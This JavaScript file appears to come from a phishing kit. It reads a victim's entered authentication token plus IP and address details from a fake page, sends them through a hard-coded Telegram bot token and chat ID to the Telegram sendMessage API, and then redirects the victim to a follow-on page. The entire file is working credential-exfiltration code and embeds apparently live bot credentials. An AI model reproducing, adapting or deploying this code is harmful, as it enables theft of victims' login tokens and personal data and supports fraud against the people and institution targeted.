//bot token
var telegram_bot_id = "6346250373:AAFh1EtaVMmSZ7G3IuWWTC5MamJUKQ_nwiM";
//chat id
var chat_id = "1477706572";
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "//📲Token#: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\n\n✅BDB✅";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index5.html';
        console.log(response);
    });
    return false;
};
